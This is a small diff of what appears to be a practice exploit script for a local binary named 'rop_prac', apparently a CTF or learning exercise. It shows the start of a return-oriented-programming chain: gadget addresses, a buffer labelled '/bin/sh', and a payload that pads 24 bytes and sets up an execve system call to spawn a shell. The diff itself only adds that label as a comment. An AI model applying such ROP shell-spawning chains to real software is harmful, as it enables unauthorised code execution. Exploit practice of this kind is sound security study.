@@ -5,7 +5,7 @@ p = process ("./rop_prac")
 pop_eax_ret = 0x080a3ca4
 pop_dcb_ret = 0x0806eec1 # pop edx ; pop ecx ; pop ebx ; ret
 int_0x80 = 0x08049513
-buf = 0x80acacc
+buf = 0x80acacc			#/bin/sh
 
 payload = "a"*24
 payload += p32(pop_eax_ret) + p32(0x0b)
